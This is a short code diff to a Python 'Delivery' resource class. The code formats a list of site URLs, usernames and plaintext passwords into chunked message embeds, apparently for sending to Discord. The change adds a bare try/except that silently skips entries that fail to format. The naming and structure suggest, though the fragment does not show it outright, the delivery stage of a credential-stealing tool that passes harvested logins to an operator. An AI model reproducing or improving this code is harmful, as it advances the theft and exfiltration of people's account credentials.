@@ -123,8 +123,11 @@ class Delivery(Resource):
             embed_descriptions = [""]
             i = 0
             for j, password in enumerate(password_list):
-                embed_descriptions[i] += password['url'] + "\nUsername: " + cb + password[
-                    'username'] + cb + "\nPassword: " + cb + password['password'] + cb + "\n"
+                try:
+                    embed_descriptions[i] += password['url'] + "\nUsername: " + cb + password[
+                        'username'] + cb + "\nPassword: " + cb + password['password'] + cb + "\n"
+                except:
+                    pass
                 if len(embed_descriptions[i]) > 3500 and j != len(password_list) - 1:
                     i += 1
                     embed_descriptions.append("")
